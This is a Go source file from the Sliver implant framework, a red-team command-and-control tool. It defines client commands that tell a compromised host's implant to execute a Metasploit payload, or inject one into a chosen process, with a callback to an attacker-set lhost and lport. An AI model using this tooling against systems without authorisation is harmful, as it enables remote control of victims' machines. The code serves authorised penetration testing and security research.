package command

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"

	consts "github.com/bishopfox/sliver/client/constants"
	clientpb "github.com/bishopfox/sliver/protobuf/client"
	sliverpb "github.com/bishopfox/sliver/protobuf/sliver"

	"github.com/bishopfox/sliver/client/spin"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func msf(ctx *grumble.Context, rpc RPCServer) {

	payloadName := ctx.Flags.String("payload")
	lhost := ctx.Flags.String("lhost")
	lport := ctx.Flags.Int("lport")
	encoder := ctx.Flags.String("encoder")
	iterations := ctx.Flags.Int("iterations")

	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if lhost == "" {
		fmt.Printf(Warn+"Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfStr)
		return
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending payload %s %s/%s -> %s:%d ...",
		payloadName, activeSliver.OS, activeSliver.Arch, lhost, lport)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&clientpb.MSFReq{
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      int32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
		SliverID:   ActiveSliver.Sliver.ID,
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgMsf,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
		return
	}

	fmt.Printf(Info + "Executed payload on target\n")
}

func msfInject(ctx *grumble.Context, rpc RPCServer) {
	payloadName := ctx.Flags.String("payload")
	lhost := ctx.Flags.String("lhost")
	lport := ctx.Flags.Int("lport")
	encoder := ctx.Flags.String("encoder")
	iterations := ctx.Flags.Int("iterations")
	pid := ctx.Flags.Int("pid")

	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if lhost == "" {
		fmt.Printf(Warn+"Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
		return
	}

	if pid == -1 {
		fmt.Printf(Warn+"Invalid pid '%s', see `help %s`\n", lhost, consts.MsfInjectStr)
		return
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
		payloadName, activeSliver.OS, activeSliver.Arch, lhost, lport)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&clientpb.MSFInjectReq{
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      int32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
		PID:        int32(pid),
		SliverID:   ActiveSliver.Sliver.ID,
	})
	resp := <-rpc(&sliverpb.Envelope{
		Type: clientpb.MsgMsfInject,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	<-ctrl
	if resp.Err != "" {
		fmt.Printf(Warn+"%s\n", resp.Err)
		return
	}

	fmt.Printf(Info + "Executed payload on target\n")
}
